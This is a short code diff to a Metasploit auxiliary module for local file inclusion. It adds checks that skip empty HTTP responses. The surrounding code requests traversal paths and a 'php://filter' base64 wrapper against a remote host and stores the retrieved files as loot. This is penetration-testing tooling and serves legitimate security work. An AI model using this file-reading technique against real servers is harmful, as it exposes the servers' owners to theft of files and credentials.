@@ -240,10 +240,14 @@ class MetasploitModule < Msf::Auxiliary
       req = ini_request(uri = (normalize_uri(datastore['PATH']) + trigger + f).chop)
       res = send_request_cgi(req, 25)
 
-      vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
+      if not res or res.body.empty?
+        next
+      end
+      
+      vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}")
 
       # Only download files that are within our interest
-      if res and res.to_s =~ datastore['PATTERN']
+      if res.to_s =~ datastore['PATTERN']
         # We assume the string followed by the last '/' is our file name
         fname = f.split("/")[-1].chop
         loot = store_loot("lfi.data","text/plain",rhost, res.body,fname)
@@ -267,7 +271,11 @@ class MetasploitModule < Msf::Auxiliary
       req = ini_request(uri = (normalize_uri(datastore['PATH']) + "php://filter/read=convert.base64-encode/resource=" + f).chop)
       res = send_request_cgi(req, 25)
 
-      vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
+      if not res or res.body.empty?
+        next
+      end
+      
+      vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}")
 
       # We assume the string followed by the last '/' is our file name
       fname = f.split("/")[-1].chop
